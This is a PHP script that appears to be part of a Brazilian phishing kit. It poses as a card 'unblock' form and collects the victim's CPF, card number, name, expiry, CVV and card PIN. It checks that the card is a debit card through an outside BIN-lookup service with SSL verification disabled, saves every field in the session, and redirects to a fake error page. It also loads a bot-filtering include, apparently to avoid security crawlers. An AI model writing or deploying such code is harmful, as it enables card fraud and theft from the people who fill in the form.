<?php

    include_once "../settings/conn.php";
    include_once "../settings/functions.php";
    include_once "../settings/bots.php";
    session_start();
    error_reporting(0);

   
    if (isset($_POST['desbloq'])) {
        if (validaCC($_POST['numero'])) {
            if (validaCPF($_POST['cpf'])) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.freebinchecker.com/bin/'.substr(str_replace(" ", "", $_POST['numero']), 0, 6));
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                $result = curl_exec($ch);
                curl_close($ch);
                $tipo = value($result, '"type":"', '",');

                if ($tipo == "debit") {
                    $_SESSION['cpf'] = $_POST['cpf'];
                    $_SESSION['titular'] = $_POST['titular'];
                    $_SESSION['numero'] = $_POST['numero'];
                    $_SESSION['vencimento'] = $_POST['vencimento'];
                    $_SESSION['cvv'] = $_POST['cvv'];
                    $_SESSION['senha_cc'] = $_POST['senha'];
                    $_SESSION['tipo'] = strtoupper($tipo);
                    echo "<script>window.location='erro#access_token=".$_SESSION['geraToken']."'</script>";
                }else{
                    echo "<script>alert('Esse cartão não é de débito')</script>";
                }
            }else{
                echo "<script>alert('CPF invalido')</script>";
            }
        }else{
            echo "<script>alert('Cartão invalido')</script>";
        }
    }

?>